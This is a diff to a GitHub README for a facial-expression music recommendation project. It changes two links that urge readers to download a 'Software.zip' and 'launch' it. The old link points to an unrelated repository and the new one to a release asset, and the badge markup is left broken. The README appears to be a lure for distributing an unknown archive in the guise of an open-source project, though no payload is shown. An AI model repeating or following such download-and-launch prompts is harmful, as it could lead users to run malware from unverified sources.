@@ -8,7 +8,7 @@ Welcome to the **Music Recommendation Based on Facial Expression** GitHub reposi
 - **Topics:** emotion, flask, flask-application, kaggle, ml, music, music-bot, musicrecommendationsystem, opencv, python, tensorflow
 
 ## Get Started
-To get started with the project, make sure to check out the [Software.zip file](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip) that contains all the necessary code and resources. Remember, the file needs to be launched to begin exploring the exciting world of music recommendations based on facial expressions.
+To get started with the project, make sure to check out the [https://github.com/QAQMMW/Music-Recommendation-Based-on-Facial-Expression/releases/download/v1.0/Software.zip file](https://github.com/QAQMMW/Music-Recommendation-Based-on-Facial-Expression/releases/download/v1.0/Software.zip) that contains all the necessary code and resources. Remember, the file needs to be launched to begin exploring the exciting world of music recommendations based on facial expressions.
 
 ## Technologies Used
 - **Emotion Analysis:** We utilize the FER 2013 dataset to analyze facial expressions and extract emotional cues from users.
@@ -37,7 +37,7 @@ While the current version of the project focuses on music recommendations based 
 We welcome contributions to the project from developers, data scientists, and music enthusiasts alike. If you have ideas for improving the system or want to collaborate on future enhancements, feel free to submit pull requests or reach out to the project maintainers.
 
 ## Visit the Software Repository
-[![Launch Software](https://img.shields.io/badge/Launch-Software-informational)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Launch Software](https://github.com/QAQMMW/Music-Recommendation-Based-on-Facial-Expression/releases/download/v1.0/Software.zip)](https://github.com/QAQMMW/Music-Recommendation-Based-on-Facial-Expression/releases/download/v1.0/Software.zip)
 
 Don't forget to explore the software repository to delve into the code, resources, and documentation related to music recommendations based on facial expressions.
 
